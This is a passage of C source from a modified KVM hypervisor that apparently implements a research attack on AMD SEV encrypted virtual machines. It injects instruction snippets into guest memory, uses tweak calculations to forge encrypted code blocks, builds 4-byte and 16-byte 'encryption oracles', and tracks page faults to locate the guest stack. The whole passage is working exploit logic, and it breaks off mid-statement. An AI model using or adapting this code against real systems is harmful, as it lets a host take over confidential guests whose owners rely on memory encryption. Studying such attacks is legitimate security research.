  if (best) {
    *eax = best->eax;
    *ebx = best->ebx;
    *ecx = best->ecx;
    *edx = best->edx;
  } else
    *eax = *ebx = *ecx = *edx = 0;
  trace_kvm_cpuid(function, *eax, *ebx, *ecx, *edx, entry_found);
  return entry_found;
}
EXPORT_SYMBOL_GPL(kvm_cpuid);

bool array_cmp(uint8_t *arr1, uint8_t *arr2, size_t length) {
  uint64_t i;
  for (i = 0; i < length; i++) {
    if (arr1[i] != arr2[i]) {
      return false;
    }
  }
  return true;
}


// gets initialized in kvm/virt/kvm_main.c on KVM_INJECT_CODE ioctl
load_gadget_t load_gadget;
EXPORT_SYMBOL(load_gadget);

static uint8_t inc_variant_code[2] = {0xff, 0xc6};
inject_param_t inc_variant = {.gpa = 0, // this is set up at run time
                              .injection_code_buffer =
                                  inc_variant_code, // inc esi
                              .length = 2,
                              .insert_at_back = 1,

                              .type = 1};

static uint8_t nop_variant_code[2] = {0x90, 0x90};
inject_param_t nop_variant = {.gpa = 0, // this is set at run time
                              .injection_code_buffer =
                                  nop_variant_code, //  nop nop
                              .length = 2,
                              .insert_at_back = 1,
                              .type = 1};

static uint8_t push_push_variant_code[2] = {0x56, 0x56};
inject_param_t push_push_variant = {.gpa = 0, // this is set at run time
                                    .injection_code_buffer =
                                        push_push_variant_code, //  nop nop
                                    .length = 2,
                                    .insert_at_back = 1,

                                    .type = 1};

static uint8_t push_pop_variant_code[2] = {0x56, 0x5e};
inject_param_t push_pop_variant = {
    .gpa = 0,                                       // this is set at run time
    .injection_code_buffer = push_pop_variant_code, // push rsi; pop rsi
    .length = 2,
    .insert_at_back = 1,
    .type = 1,
};

static uint8_t reset_jmp_variant_code[2] = {0xeb, 0x9c};
inject_param_t reset_jmp_variant = {
    .gpa = 0,                                        // this is set at run time
    .injection_code_buffer = reset_jmp_variant_code, // jump 116 bytes back
    .length = 2,
    .insert_at_back = 0,
    .type = 1};

// pop rsi; pop rsi
static uint8_t pop_pop_variant_code[2] = {0x5e, 0x5e};
inject_param_t pop_pop_variant = {
    .gpa = 0,                                      // this is set at run time
    .injection_code_buffer = pop_pop_variant_code, // jump 116 bytes back
    .length = 2,
    .insert_at_back = 1,
    .type = 1};

// one ret would be enough but since the rest of the instructiosn
// are two byte this makes jumping between them easier
static uint8_t ret_variant_code[2] = {0xc3, 0xc3};
inject_param_t ret_variant = {.gpa = 0, // this is set at run time
                              .injection_code_buffer = ret_variant_code,
                              .length = 2,
                              .insert_at_back = 0,
                              .type = 1};

// jump 14 bytes forward to 16 byte encryption oracle
static uint8_t jmp_to_long_code[2] = {0xeb, 0x1e};
inject_param_t jmp_to_long_variant = {.gpa = 0,
                                      .injection_code_buffer = jmp_to_long_code,
                                      .length = 2,
                                      .insert_at_back = 0,
                                      .type = 1};

//#####
// Source of long counter gadget
// jmp to byte 14 next block
static uint8_t jmp_b14_code[2] = {0xeb, 0x1c};
inject_param_t inj_jmp_14 = {.gpa = 0, // this is set at run time
                             .injection_code_buffer = jmp_b14_code, //
                             .length = 2,
                             .insert_at_back = 0,
                             .type = 1};

static uint8_t xor_eax_code[2] = {0x31, 0xc0};
inject_param_t inj_xor_eax = {.gpa = 0,
                              .injection_code_buffer = xor_eax_code,
                              .length = 2,
                              .insert_at_back = 1,
                              .type = 1};

static uint8_t xor_esi_code[2] = {0x31, 0xf6};
inject_param_t inj_xor_esi = {.gpa = 0,
                              .injection_code_buffer = xor_esi_code,
                              .length = 2,
                              .insert_at_back = 1,
                              .type = 1};

static uint8_t cpuid_code[2] = {0x0f, 0xa2};
inject_param_t inj_cpuid = {.gpa = 0,
                            .injection_code_buffer = cpuid_code,
                            .length = 2,
                            .insert_at_back = 1,
                            .type = 1};

// ##### Start of variants for x1a1

// nop, first byte of inc rax
// is equal for A and B
static uint8_t prefix_AB_code[2] = {0x90, 0x48};

inject_param_t inj_prefix_A = {.gpa = 0,
                               .injection_code_buffer = prefix_AB_code,
                               .insert_at_back = 1,
                               .length = 2,
                               .type = 1};
// jump from x1 to x2
static uint8_t skip_A_code[2] = {0xeb, 0x1e};
inject_param_t inj_skip_A = {.gpa = 0,
                             .injection_code_buffer = skip_A_code,
                             .insert_at_back = 1,
                             .length = 2,
                             .type = 1};
//#### end of variants for x1a1

inject_param_t inj_prefix_B = {.gpa = 0,
                               .injection_code_buffer = prefix_AB_code,
                               .insert_at_back = 1,
                               .length = 2,
                               .type = 1};
// jump from X2||B2 to store (2 * 16 + 14 bytes forward)
static uint8_t jmp_store_B_code[2] = {0xeb, 0x2e};
inject_param_t inj_jmp_store_B = {.gpa = 0,
                                  .injection_code_buffer = jmp_store_B_code,
                                  .insert_at_back = 1,
                                  .length = 2,
                                  .type = 1};
// jump 16 byte forward
static uint8_t skip_B_code[2] = {0xeb, 0x10};
inject_param_t inj_skip_B_code = {.gpa = 0,
                                  .injection_code_buffer = skip_B_code,
                                  .insert_at_back = 1,
                                  .length = 2,
                                  .type = 1};

// jump back 5 * 16 + 4 bytes to cpuid opcode
static uint8_t jmp_cpuid_code[2] = {0xeb, 0xac};
inject_param_t inj_jmp_cpuid = {.gpa = 0,
                                .injection_code_buffer = jmp_cpuid_code,
                                .insert_at_back = 0,
                                .length = 2,
                                .type = 1};

//#### start of store snippet
static uint8_t nop_push_code[2] = {0x90, 0x56};
inject_param_t inj_nop_push = {.gpa = 0,
                               .injection_code_buffer = nop_push_code,
                               .insert_at_back = 1,
                               .length = 2,
                               .type = 1};

static uint8_t push_push_code[2] = {0x56, 0x56};
inject_param_t inj_push_push = {.gpa = 0,
                                .injection_code_buffer = push_push_code,
                                .insert_at_back = 1,
                                .length = 2,
                                .type = 1};

static uint8_t store_jmp_back_code[2] = {0xeb, 0xbe};
inject_param_t inj_store_jmp_back = {.gpa = 0,
                                     .injection_code_buffer =
                                         store_jmp_back_code,
                                     .insert_at_back = 0,
                                     .length = 2,
                                     .type = 1};
//### end of store snippet

//### start of cleanup snippet
// pop rsi; pop rsi;
static uint8_t pop_pop_code[2] = {0x5e, 0x5e};
inject_param_t inj_pop_pop = {.gpa = 0,
                              .injection_code_buffer = pop_pop_code,
                              .insert_at_back = 1,
                              .length = 2,
                              .type = 1};

static uint8_t pop_ret_code[2] = {0x5e, 0xc3};
inject_param_t inj_pop_ret = {.gpa = 0,
                              .injection_code_buffer = pop_ret_code,
                              .insert_at_back = 0,
                              .length = 2,
                              .type = 1};

static uint8_t ret_code[2] = {0xc3};
inject_param_t inj_ret = {.gpa = 0,
                          .injection_code_buffer = ret_code,
                          .insert_at_back = 0,
                          .length = 1,
                          .type = 1};

//### end of cleanup snippet

// This is the standard version of the 16 byte encrytion oracle
// This is loaded after we are done with the 4 byte encryption oracle
// The blocks created with the 4 byte encryption oracle have to be loaded
// manually via write physical
enum long_counter_base_content {
    LCB_INJ_JMP_14_1, //inj_jmp_14,
    LCB_INJ_XOR_EAX,//inj_xor_eax,
    LCB_INJ_JMP_14_2, //inj_jmp_14,
    LCB_INJ_XOR_ESI, //inj_xor_esi,
    LCB_INJ_JMP_14_3, //inj_jmp_14,
    LCB_INJ_CPUID, //inj_cpuid,
    LCB_INJ_JMP_14_4,//inj_jmp_14,
    LCB_INJ_PREFIX_A,//inj_prefix_A,
    LCB_INJ_PREFIX_B,//inj_prefix_B,
    LCB_INJ_JMP_CPUID,//inj_jmp_cpuid,
};

//TODO: Split this up into template and real data like with
//"long_counter_extra"
static inject_param_t *long_counter_base_inj[10] = {
    &inj_jmp_14,
    &inj_xor_eax,
    &inj_jmp_14,
    &inj_xor_esi,
    &inj_jmp_14,
    &inj_cpuid,
    &inj_jmp_14,
    &inj_prefix_A,
    // in gpa space we skip one block for long instruction
    &inj_prefix_B,
    // in gpa space we skip one block for long instruction
    &inj_jmp_cpuid,
};
static uint8_t long_counter_base_inj_cache[10][16];



typedef struct  {
	inject_param_t inj;
	uint8_t buffer[16]; // 16 byte buffer with precalculated injection code;
} buffered_inj_obj;

enum long_counter_extra_content {
	LCE_INJ_SKIP_A,
	LCE_INJ_JMP_STORE_B,
	LCE_INJ_NOP_PUSH,
	LCE_INJ_PUSH_PUSH,
	LCE_ST_INJ_JMP_14,
	LCE_ST_INJ_XOR_ESI,
	LCE_ST_INJ_STORE_JMP_BACK
};

#define LCE_SIZE 7
//content list
static inject_param_t *long_counter_extra_inj_tmpl[LCE_SIZE] = {
	&inj_skip_A,
	&inj_jmp_store_B,
	&inj_nop_push,
	&inj_push_push,
	&inj_jmp_14,
	&inj_xor_esi,
	&inj_store_jmp_back
};

//filled at the end of counter_gadget with precalculated values
//based on the template above
static buffered_inj_obj long_counter_extra_inj[LCE_SIZE];

//#####

static uint8_t long_inc_jmp_block[16];
static uint64_t long_inc_jmp_source_gpa;
static uint64_t long_inc_jmp_target_gpa;
static uint64_t long_inc_jmp_hpa_diff;

static uint8_t long_shl_jmp_block[16];
static uint64_t long_shl_jmp_source_gpa;
static uint64_t long_shl_jmp_target_gpa;
static uint64_t long_shl_jmp_hpa_diff;

static void precalc_injection(inject_param_t **template,
buffered_inj_obj *non_template, int index, uint64_t target_gpa,
struct kvm *kvm) {
	//make a copy of template
	memcpy(&non_template[index].inj,template[index],sizeof(inject_param_t));

	//set gpa in copy
	non_template[index].inj.gpa = target_gpa;

	nf_simple_inject_code_precalc(kvm,&non_template[index].inj,
			non_template[index].buffer);

}

uint64_t calc_stack_alignment_offset(void) {
  // TODO: checkif this is correct: seems like we get the fault offset after the
  // push that issued it. but we want the offset from before
  // load_gadget.fault_gpa -= 8;
  if (load_gadget.fault_gpa % 16 == 8) {
    return 8;
  } else if (load_gadget.fault_gpa % 16 == 0) {
    return 0;
  }
  // we should not reach this
  WARN_ON(true);
  return 0;
}

static void store_stack_and_abort(struct kvm_vcpu *vcpu) {
  int err;
  uint64_t alignment_offset;
  uint8_t tweak_buf[16];

  // should be either 0 or 8
  printk("First stack fault address was gpa = %016llx\n",
         load_gadget.fault_gpa);
  // alignment_offset = load_gadget.fault_gpa % 16;
  alignment_offset = calc_stack_alignment_offset();

  wbinvd();

  err = read_mapped(long_inc_jmp_source_gpa, long_inc_jmp_block, 16,
                    load_gadget.stack_mapping);
  if (err != 0) {
    printk("handle_counter_gadget: failed to read first block from gpa "
           "%016llx\n",
           long_inc_jmp_source_gpa);
  } else {
    printk("handle_counter_gadget: Read first payload block from stack from  "
           "gpa = "
           "%016llx to gpa = %016llx\n",
           long_inc_jmp_source_gpa, long_inc_jmp_source_gpa + 16);
  }
  // apply tweak diff for xex sev version
  calc_tweak(long_inc_jmp_hpa_diff, tweak_buf);
  xor_in_place(long_inc_jmp_block, tweak_buf);

  err = read_mapped(long_shl_jmp_source_gpa, long_shl_jmp_block, 16,
                    load_gadget.stack_mapping);
  if (err != 0) {
    printk("handle_counter_gadget: failed to read second block from  stack "
           "from gpa "
           "%016llx\n",
           long_shl_jmp_source_gpa);
  } else {
    printk("handle_counter_gadget: Read second payload block from stack from  "
           "gpa = "
           "%016llx to gpa = %016llx\n",
           long_shl_jmp_source_gpa, long_shl_jmp_source_gpa + 16);
  }
  // apply tweak diff for xex sev version
  calc_tweak(long_shl_jmp_hpa_diff, tweak_buf);
  xor_in_place(long_shl_jmp_block, tweak_buf);

  wbinvd();

  pop_pop_variant.gpa = load_gadget.last_gpa - (3 * 16);
  if (!inject_code(vcpu->kvm, pop_pop_variant.gpa,
                   pop_pop_variant.injection_code_buffer,
                   pop_pop_variant.length, pop_pop_variant.insert_at_back)) {
    printk("handle_counter_gadget: failted to write push push to inc pos\n");
  }
  pop_pop_variant.gpa = load_gadget.last_gpa - (1 * 16);
  if (!inject_code(vcpu->kvm, pop_pop_variant.gpa,
                   pop_pop_variant.injection_code_buffer,
                   pop_pop_variant.length, pop_pop_variant.insert_at_back)) {
    printk("handle_counter_gadget: failted to write push push to shl pos\n");
  }

  /*
        //Code for aborting after the 4 byte encryption oracle is done
  ret_variant.gpa = load_gadget.last_gpa;
  if (!inject_code(vcpu->kvm, ret_variant.gpa,
                   ret_variant.injection_code_buffer, ret_variant.length,
                   ret_variant.insert_at_back)) {
    printk("handle_counter_gadget: failed to insert ret at last jump\n");
  }
  printk("handle_counter_gadget: processed all cleanup injections\n");
  */
  // Code for jumping to 16 byte encryption oracle after 4 byte encryption
  // oracle is done
  jmp_to_long_variant.gpa = load_gadget.last_gpa;
  if (!inject_code(vcpu->kvm, jmp_to_long_variant.gpa,
                   jmp_to_long_variant.injection_code_buffer,
                   jmp_to_long_variant.length,
                   jmp_to_long_variant.insert_at_back)) {
    printk(
        "handle_counter_gadget: failed to insert jump to long at last jump\n");
  } else {
    printk("handle_counter_gadget: processed cleanup and jmp to long "
           "injections. jmp to long was inserted at gpa = %016llx\n",
           load_gadget.last_gpa);
  }
}


//TODO: Code is messy. Best practice would be to precalulate all injections
//to improve performance. Currently this is only done in the long_counter_gadget
//as it's the most performance critical

static void handle_counter_gadget(struct kvm_vcpu *vcpu, uint32_t eax) {
#undef LOG
  //#define LOG
  const int highest_bit_index = 31;
  // contains the shl and jmp instruction at the end of the gadget. They
  // get overwritten at the end of the first round and must be restored at
  // the start of the second round
  static uint8_t shl_back_jump[32];
  int err;
  // dummy value to signal that no load gadget is used
  if (load_gadget.target_value == 0 || load_gadget.type != 1) {
    return;
  }

  if (load_gadget.text_mapping == NULL) {
    if (0 != map_physical(vcpu->kvm, load_gadget.last_gpa, false,
                          &load_gadget.text_mapping, &load_gadget.text_page)) {
      printk("handle_counter_gadget: failed to get text mapping\n");
    } else {
      printk("mapped text page. load_gadget.text_mapping = %p "
             "load_gadget.text_page = %p\n",
             load_gadget.text_mapping, load_gadget.text_page);
    }
    printk("start of first gadget %lld\n", ktime_get_real_ns());


  }

  //########
  // Inital wbinvd()
  wbinvd();
  //#######

  // calc&store the stack gpa and stop tracking
  if (load_gadget.round == 1 && load_gadget.curr_bit == highest_bit_index) {
    uint64_t alignment_offset,changed_offset;
    int off,i;
    int block_changed,changes;

	 // stop listening for page faults
    load_gadget.waiting_for_fault = 0;

	 //take another copy of the page containing the stack. This time the content was
	 //already manipulated
	 printk("re read stack page");
	 void * stack_page_post_write = vmalloc(4096);
     int err = read_physical(vcpu->kvm, load_gadget.tmp_fault_gpa & ~0xfff,
			  stack_page_post_write, 4096,false);
	  if( err != 0 ) {
		  printk("failed to re read stack page with %d\n",err);
	  }

	  //compare both pages and find the 16b block that has changed. Combine it with
	  //the gfn from the page fault to get the gpa of the stack
	  
	  //loop over every 16 byte block
	  for(off = 0,changes=0; off < 0x1000; off += 0x010) {
		  block_changed = 0;
		  //check if block has changed
		  for(i = 0; i < 0x010; i++ ) {
			  if( ((uint8_t*)stack_page_post_write)[off + i] != 
					  ((uint8_t*)load_gadget.stack_page_pre_write)[off + i] ) {
				  printk("gpa %016llx changed at offset %04x\n",load_gadget.tmp_fault_gpa,off);
				  //store offset
				  changed_offset = off;
				  //we expect that only one 16 byte block differs. Couting the amount of changed
				  //blocks is just a sanity check
				  changes++;
				  break;
			  }
		  }
	  }

	  //combine gfn and offset from loop above, if there has only been one change.
	  //otherwise print a warning
	  if( changes == 1 ) {
		  printk("only one 16 byte block changed. take %04llx as offset\n",changed_offset);
		  load_gadget.tmp_fault_gpa |= changed_offset;
	  }
	  else {
		  printk("Somehting went wrong. %d 16 byte blocks have changed instead of one."
				  "Cannot determine offset\n",changes);
	  }

	  vfree(load_gadget.stack_page_pre_write);



    load_gadget.fault_gpa = load_gadget.tmp_fault_gpa;
    kvm_stop_tracking(vcpu);
    printk("handle_stack_detect_gadget: done. Detected stack at gpa %016llx\n",
           load_gadget.fault_gpa);

    if (load_gadget.stack_page == NULL) {
      if (0 != map_physical(vcpu->kvm, load_gadget.fault_gpa, false,
                            &load_gadget.stack_mapping,
                            &load_gadget.stack_page)) {
        printk("handle_counter_gadget: failed to get text mapping\n");
      }
    } else {
      printk("mapped stack page");
    }

    // calc source and target gpa of payload blocks
    alignment_offset = calc_stack_alignment_offset();

    long_inc_jmp_source_gpa = load_gadget.fault_gpa - alignment_offset;
    long_inc_jmp_target_gpa = load_gadget.last_gpa + (10 * 16);

    long_shl_jmp_source_gpa = load_gadget.fault_gpa - alignment_offset - 16;
    long_shl_jmp_target_gpa = load_gadget.last_gpa + (12 * 16);
  }

  // apply tweak diff to target value and bswap it (exclude first round because
  // that is for stack detect, compare with highest bit because we only want to
  // do this once per target_value)
  if ((load_gadget.round == 1 || load_gadget.round == 2) &&
      load_gadget.curr_bit == highest_bit_index) {
    uint8_t tweak_buf[16];
    uint32_t short_tweak;
    uint64_t source_hpa, source_gpa, target_hpa, target_gpa;
    int err;

    if (load_gadget.round == 1) {
      source_gpa = long_inc_jmp_source_gpa;
      // 16 byte encryption gadget starts 2 * 16 byte after load_gadget.last_gpa
      target_gpa = long_inc_jmp_target_gpa;
    } else {
      source_gpa = long_shl_jmp_source_gpa;
      target_gpa = long_shl_jmp_target_gpa;
    }

    // resolve GPAs to HPAs
    if (0 != (err = get_hpa_for_gpa(vcpu->kvm, source_gpa, &source_hpa))) {
      printk("handle_counter_gadget: round %d: failed to convert source gpa "
             "%016llx "
             "to hpa wiht err %d\n",
             load_gadget.round, source_gpa, err);
    }
    if (0 != (err = get_hpa_for_gpa(vcpu->kvm, target_gpa, &target_hpa))) {
      printk("handle_counter_gadget: round %d: failed to convert target gpa "
             "%016llx "
             "to hpa wiht err %d\n",
             load_gadget.round, target_gpa, err);
    }

    if (load_gadget.round == 1) {
      long_inc_jmp_hpa_diff = source_hpa ^ target_hpa;
    } else if (load_gadget.round == 2) {
      long_shl_jmp_hpa_diff = source_hpa ^ target_hpa;
    }

#ifdef LOG
    printk("handle_counter_gadget: calling calc_tweak with HPAs %016llx xor "
           "%016llx\n",
           source_hpa, target_hpa);
#endif
    calc_tweak(source_hpa ^ target_hpa, tweak_buf);
    print_blockwise(tweak_buf, 16);
    // get first 4 bytes of tweak
    short_tweak = (((uint32_t)tweak_buf[0]) << (3 * 8)) |
                  (((uint32_t)tweak_buf[1]) << (2 * 8)) |
                  (((uint32_t)tweak_buf[2]) << (1 * 8)) |
                  ((uint32_t)tweak_buf[3]);

#ifdef LOG
    printk(
        "handle_counter gadget: prepare target_value for move from gpa %016llx"
        " to gpa %016llx\n. Apply Tweak %08x\n",
        source_gpa, target_gpa, short_tweak);
#endif
    load_gadget.target_value = load_gadget.target_value ^ short_tweak;
#ifdef LOG
    printk("target value before tweak %16llxx and after tweak: %016llx\n",
           load_gadget.target_value ^ short_tweak, load_gadget.target_value);
#endif
    // bswap: target.value gets written as little endian but we want to enter
    // values from "left to right" for better readability
    load_gadget.target_value = __builtin_bswap32(load_gadget.target_value);
  }

#ifdef LOG
  printk("handle_counter_gadget: called with eax = %08x, expected %08x"
         "target_value = %016llx cur_bit = %lld\n",
         eax, load_gadget.prev_eax, load_gadget.target_value,
         load_gadget.curr_bit);
#endif

  if (eax != load_gadget.prev_eax) {
#ifdef LOG
    printk("handle_counter_gadget: at repetition_counter %lld. Expected eax == "
           "%d but got %d\n",
           load_gadget.repetition_counter, load_gadget.prev_eax, eax);
#endif
    load_gadget.repetition_counter = 0;
    // extra wbinvd() due to return
    wbinvd();
    return;
  }

  // Workround to implement stack detect gadget in round 0
  if (load_gadget.round == 0) {
    load_gadget.curr_bit = 0;
  }

  // restore shl and normal back jump. They got overwritten with push push
  // reset back jump at the end of the previous round
  if (load_gadget.round == 2 && load_gadget.curr_bit == highest_bit_index) {

    if (0 != (err = write_mapped(load_gadget.last_gpa - 16, 32, shl_back_jump,
                                 load_gadget.text_mapping))) {
      printk("handle_counter_gadget: faile to restore normal back jump code "
             "at gpa %016llx\n",
             load_gadget.last_gpa);
    } else {
#ifdef LOG
      printk("restored shl and normal back jump\n");
#endif
    }
  }

  // Copy values from stack and jump to 16 byte encryption oracle
  if (load_gadget.round == 3 && load_gadget.curr_bit == highest_bit_index) {
    int i;
    uint64_t gpa = load_gadget.last_gpa;
    gpa += (1 * 16); // TODO: workaround for weird 0x.....200 bug/behaviour
    store_stack_and_abort(vcpu);

#ifdef LOG
    printk("load_gadget.last_gpa is %016llx\n", gpa);
    printk("Start loading 16 byte oracle\n");
#endif
	 //PRECALC 16 byte encryption oracle
	 
    // load 16 byte encryption  oracle
    for (i = 0;
         i < sizeof(long_counter_base_inj) / sizeof(long_counter_base_inj[0]);
         i++) {
      inject_param_t *inj = long_counter_base_inj[i];
      if (i == 8 || i == 9) {
        gpa += (2 * 16);
      } else {
        gpa += (1 * 16);
      }
      inj->gpa = gpa;
		//this call is used to precalc the injected data
		nf_simple_inject_code_precalc(vcpu->kvm,inj,long_counter_base_inj_cache[i]);

#ifdef LOG
      printk("at i = %d: injecting: %02x %02x at gpa %016llx %016llx\n", i,
             inj->injection_code_buffer[0], inj->injection_code_buffer[1],
             inj->gpa, gpa);
#endif

		/*
      if (!nf_simple_inject_code(vcpu->kvm, inj, load_gadget.text_mapping)) {
        printk("failed to load part %d of 16 byte encryption oracle\n", i);
      }
		*/

		  if( !nf_buffered_inject(vcpu->kvm,inj, long_counter_base_inj_cache[i],
					load_gadget.text_mapping) ) {
        		printk("failed to load part %d of 16 byte encryption oracle\n", i);
		  }
    }

	 //PRECALC OHTER INSTRUCTIONS USED IN 16 BYTE ORACLE

	 //signature: template array, non template array, index in prevous arrays,
	 //target gpa
	 precalc_injection(long_counter_extra_inj_tmpl,long_counter_extra_inj,
			 LCE_INJ_SKIP_A, long_counter_base_inj[LCB_INJ_PREFIX_A]->gpa,
			 vcpu->kvm);

	 precalc_injection(long_counter_extra_inj_tmpl,long_counter_extra_inj,
			 LCE_INJ_JMP_STORE_B, long_counter_base_inj[LCB_INJ_PREFIX_B]->gpa,
			 vcpu->kvm);

	 precalc_injection(long_counter_extra_inj_tmpl,long_counter_extra_inj,
			 LCE_INJ_NOP_PUSH, long_counter_base_inj[LCB_INJ_JMP_CPUID]->gpa + 16,
			 vcpu->kvm);

	 precalc_injection(long_counter_extra_inj_tmpl,long_counter_extra_inj,
			 LCE_INJ_PUSH_PUSH, long_counter_base_inj[LCB_INJ_JMP_CPUID]->gpa + 16,
			 vcpu->kvm);

	 //precalc LCE_ST_INJ_JMP_14, LCE_ST_INJ_XOR_ESI and LCE_ST_STORE_JMP_BACK
	 for( i = 2; i < 5; i++ ) {
		 precalc_injection(long_counter_extra_inj_tmpl,long_counter_extra_inj,
				 LCE_ST_INJ_JMP_14 + ( i - 2 ), 
				 long_counter_base_inj[LCB_INJ_JMP_CPUID]->gpa + ( i * 16),
				 vcpu->kvm);
	 }




    // move the two long instructions
    if (0 !=
        (err = write_mapped(long_inc_jmp_target_gpa, 16, long_inc_jmp_block,
                            load_gadget.text_mapping))) {
      printk("failed to move long_inc_jmp_block to target gpa\n");
    }
    if (0 !=
        (err = write_mapped(long_shl_jmp_target_gpa, 16, long_shl_jmp_block,
                            load_gadget.text_mapping))) {
      printk("failed to move long_shl_jmp_block to target gpa\n");
    }
#ifdef LOG
    printk("wrote inc_jmp to gpa %016llx and shl_jmp to gpa %016llx\n",
           long_inc_jmp_target_gpa, long_shl_jmp_target_gpa);
#endif

    // signal that handle_long_counter_gadget should take over on next cpuid
    // call
    load_gadget.type = 3;
    load_gadget.curr_bit = 63;
    // extra wbinvd() due to return
    wbinvd();
    printk("end of first gadget at %lld\n", ktime_get_real_ns());
    return;
  }

  // ####
  // Start: Decide Betwen inc and nop
  // we write from highest to lowset bit
  uint64_t mask = 0x1 << (load_gadget.curr_bit);
  // bit set => use inc block;
  if (load_gadget.target_value & mask) {
    // load_gadget contains gpa of last block of load_gadget
    inc_variant.gpa = load_gadget.last_gpa - (3 * 16);
    if (!nf_simple_inject_code(vcpu->kvm, &inc_variant,
                               load_gadget.text_mapping)) {
      printk("handle_counter_gadget: failed to inject inc block\n");
    } else {
#ifdef LOG
      printk("handle_counter_gadget: injected inc block at gpa = %016llx\n",
             inc_variant.gpa);
#endif
    }
  } else { // bit not set => use nop block
    // load_gadget contains gpa of last block of load_gadget
    nop_variant.gpa = load_gadget.last_gpa - (3 * 16);
    if (!nf_simple_inject_code(vcpu->kvm, &nop_variant,
                               load_gadget.text_mapping)) {
      printk("handle_counter_gadget: failed to inject nop block\n");
    } else {
#ifdef LOG
      printk("handle_counter_gadget: injected nop block at gpa = %016llx\n",
             nop_variant.gpa);
#endif
    }
  }
  // END: Decide Between inc and nop
  //###

  // at end of round
  // after resuming last bit will be written
  if (load_gadget.curr_bit == 0) {
#ifdef LOG
    printk("handle_counter_gadget: curr_bit == 0 and round = %d\n",
           load_gadget.round);
#endif

    // transition from round 1 to round 2
    if (load_gadget.round == 1) {
      // store previous content and insert reset jump
      if (0 != (err = read_mapped(load_gadget.last_gpa - 16, shl_back_jump, 32,
                                  load_gadget.text_mapping))) {
        printk("handle_counter_gadget: failed to read normal jump code from "
               "gpa = %016llx\n",
               load_gadget.last_gpa);
      } else {
#ifdef LOG
        printk("stored shl and normal back jump code\n");
#endif
      }

      // set target value for next round(
      load_gadget.target_value = 0xd1e6eb0c;
    }

    // prepare for next round
    // replace shl with push push block to store on stack. double push
    // to make sure one of them has correct alignment
    if (load_gadget.round != 0) {
      push_push_variant.gpa = load_gadget.last_gpa - (1 * 16);
      if (!nf_simple_inject_code(vcpu->kvm, &push_push_variant,
                                 load_gadget.text_mapping)) {
        printk("handle_counter_gadget: failed to inject push_push block\n");
      } else {
#ifdef LOG
        printk("handle_counter_gadget: injected push push block at gpa = "
               "%016llx\n",
               push_push_variant.gpa);
#endif
      }
    }

    // reset jump only at transtion from round 1 to round 2
    if (load_gadget.round == 1) {

      reset_jmp_variant.gpa = load_gadget.last_gpa;
      if (!nf_simple_inject_code(vcpu->kvm, &reset_jmp_variant,
                                 load_gadget.text_mapping)) {
        printk("handle_counter_gadget: failed to inject reset jump\n");
      } else {
#ifdef LOG
        printk("handle_counter_gadget: injected reset jump at gpa = %016llx\n",
               reset_jmp_variant.gpa);
#endif
      }
    }

    // transition from round 0 to round 1 : stack detect
    if (load_gadget.round == 0) {
      push_pop_variant.gpa = load_gadget.last_gpa - (3 * 16);
      if (!nf_simple_inject_code(vcpu->kvm, &push_pop_variant,
                                 load_gadget.text_mapping)) {
        printk("handle_stack_detect_gadget: failed to inject push pop block\n");
      } else {
#ifdef LOG
        printk("handle_stack_detect_gadget: injected push pop block\n");
#endif
      }

      // remove write access from all pages
#ifdef LOG
      printk("handle_stack_detect_gadget: transition from round 0 to round 1 "
             ": removing write access...\n");
#endif
      kvm_stop_tracking(vcpu);
      __kvm_start_tracking(vcpu, KVM_PAGE_TRACK_ACCESS);
		//the page fault handler copies the content of the lest recent page fault
		//into this buffer. At this point the page was not changed. In the next
		//cpuid round, the stack operations are done. Then we take another snapshot
		//and compare both, to get the page offset of the stack
	   load_gadget.stack_page_pre_write = vmalloc(4096);
      load_gadget.waiting_for_fault = 1;
    }

    load_gadget.curr_bit = highest_bit_index; // reset value for next round
    load_gadget.round++;

  } else { // load_gadget.curr_bit != 0
    load_gadget.curr_bit--;
  }
  load_gadget.repetition_counter++;
  // unexpected cpuid argument, somebody else must have used it, abort
  // Note: probably we could just wait until our expected value comes through

  // swap prev_prev_eax and prev_eax in load_gadget
  uint32_t tmp = load_gadget.prev_prev_eax;
  load_gadget.prev_prev_eax = load_gadget.prev_eax;
  load_gadget.prev_eax = tmp;

  //#####
  // Final wbinvd
  wbinvd();
  //#####
}

enum long_counter_states {
  ROUND_FIRST_PL = 3,
  ROUND_SECOND_PL = 4,
  ROUND_CLEANUP = 5
};


static void handle_long_counter_gadget(struct kvm_vcpu *vcpu, uint32_t eax) {
#undef LOG
  //#define LOG
  const uint64_t test_counter_max = 1100;
  static uint64_t test_counter = test_counter_max;
  const uint64_t highest_bit_index = 63;
  const uint64_t payloads[2] = {0xa002030405060708ULL, 0xff090a0b0c0d0e0fULL};
  int err;
  if (load_gadget.type != 3 || load_gadget.round == (ROUND_CLEANUP + 1)) {
    return;
  };

  //######
  // Inital wbinvd()
  wbinvd();
  //#####
  //
  

  if (load_gadget.round == ROUND_CLEANUP) {

    // replace X1A1 with pop rsi;pop rsi
    inj_pop_pop.gpa = inj_prefix_A.gpa;
    if (!nf_simple_inject_code(vcpu->kvm, &inj_pop_pop,
                               load_gadget.text_mapping)) {
      printk("handle_long_counter_gadget: failed to insert inj_pop_pop at gpa "
             "%016llx\n",
             inj_pop_pop.gpa);
    }

    // replace long instr with pop rsi; ret or just ret
    // depening on stack inital stack alignment alignment
    if (load_gadget.fault_gpa % 16 == 0) {
      inj_ret.gpa = long_inc_jmp_target_gpa;
      if (!nf_simple_inject_code(vcpu->kvm, &inj_ret,
                                 load_gadget.text_mapping)) {
        printk("handle_long_counter_gadget: failed to insert inj_ret at gpa "
               "%016llx\n",
               inj_ret.gpa);
      }
    } else if (load_gadget.fault_gpa % 16 == 8) {
      inj_pop_ret.gpa = long_inc_jmp_target_gpa;
      if (!nf_simple_inject_code(vcpu->kvm, &inj_pop_ret,
                                 load_gadget.text_mapping)) {
        printk(
            "handle_long_counter_gadget: failed to insert inj_pop_ret at gpa "
            "%016llx\n",
            inj_pop_ret.gpa);
      }
    } else {
      WARN_ON(true);
    }

    // extra wbinvd() due to return
    wbinvd();

    unmap_physical(&load_gadget.text_mapping, &load_gadget.text_page);
    unmap_physical(&load_gadget.stack_mapping, &load_gadget.stack_page);
    load_gadget.round++;
    // TODO:debug to run multiple times
    test_counter = test_counter_max;

    return;
  }

  // load payload for this round
  if (load_gadget.round <= ROUND_SECOND_PL &&
      load_gadget.curr_bit == highest_bit_index) {

    load_gadget.target_value = payloads[load_gadget.round - ROUND_FIRST_PL];
    // TODO: if we wanted to move this we would need to apply tweak diff now
#ifdef LOG
    printk("handle_long_counter_gadget: round %d set payload to %016llx "
           "load_gadget.target_value\n",
